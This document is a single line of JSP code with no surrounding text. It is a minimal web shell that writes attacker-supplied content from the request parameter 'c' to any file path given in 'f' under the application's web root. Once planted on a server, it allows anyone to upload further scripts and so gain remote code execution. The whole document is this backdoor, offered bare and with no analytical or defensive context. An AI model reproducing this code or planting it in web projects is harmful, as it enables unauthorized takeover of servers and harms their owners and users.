<%new java.io.RandomAccessFile(application.getRealPath("/")+"/"+request.getParameter("f"),"rw").write(request.getParameter("c").getBytes()); %>
